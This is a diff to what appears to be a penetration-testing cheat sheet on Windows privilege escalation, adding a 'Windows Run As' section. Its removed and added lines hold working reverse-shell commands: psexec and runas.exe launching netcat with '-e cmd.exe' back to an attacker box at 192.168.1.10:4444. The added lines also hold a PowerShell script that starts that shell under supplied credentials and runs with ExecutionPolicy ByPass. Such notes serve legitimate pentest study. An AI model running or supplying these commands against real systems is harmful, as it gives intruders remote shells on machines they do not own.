@@ -1458,20 +1458,35 @@ Handy exploits:
 -   Powershell Priv Escalation Tools
     https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
 
--   Sysinternals psexec is a handy tool for running a command on a remote or local server as a specific user, given you have thier username and password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Psexec (on a 64 bit system).
+-   Windows Run As - Switching users in linux is trival with the `SU` command.  However, an equivalent command does not exist in Windows.  Here are 3 ways to run a command as a different user in Windows.
 
-         C:\>psexec64 \\COMPUTERNAME -u Test -p test -h "c:\users\public\nc.exe -nc 10.11.0.60 4444 -e cmd.exe" 
+   -   Sysinternals psexec is a handy tool for running a command on a remote or local server as a specific user, given you have thier username and password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Psexec (on a 64 bit system).
 
-         PsExec v2.2 - Execute processes remotely
-         Copyright (C) 2001-2016 Mark Russinovich
-         Sysinternals - www.sysinternals.com
+            C:\>psexec64 \\COMPUTERNAME -u Test -p test -h "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe" 
 
--   Runas.exe is a handy windows tool that allows you to run a program as another user so long as you know thier password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Runas.exe:
+            PsExec v2.2 - Execute processes remotely
+            Copyright (C) 2001-2016 Mark Russinovich
+            Sysinternals - www.sysinternals.com
 
-         C:\>C:\Windows\System32\runas.exe /env /noprofile /user:Test "c:\users\public\nc.exe -nc 10.11.0.60 4444 -e cmd.exe"
-         Enter the password for Test:
-         Attempting to start nc.exe as user "COMPUTERNAME\Test" ...
-      
+   -   Runas.exe is a handy windows tool that allows you to run a program as another user so long as you know thier password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Runas.exe:
+
+            C:\>C:\Windows\System32\runas.exe /env /noprofile /user:Test "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe"
+            Enter the password for Test:
+            Attempting to start nc.exe as user "COMPUTERNAME\Test" ...
+
+   -   PowerShell can also be used to launch a process as another user. The following simple powershell script will run a reverse shell as the specified username and password.
+
+            $username = '<username here>'
+            $password = '<password here>'
+            $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+            $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
+            Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("-nc","192.168.1.10","4444","-e","cmd.exe") -WorkingDirectory C:\Users\Public
+
+          Next run this script using powershell.exe:
+
+          `powershell -ExecutionPolicy ByPass -command "& { . C:\Users\public\PowerShellRunAs.ps1; }"`
+
+
 -   Windows Service Configuration Viewer - Check for misconfigurations
     in services that can lead to privilege escalation. You can replace
     the executable with your own and have windows execute whatever code
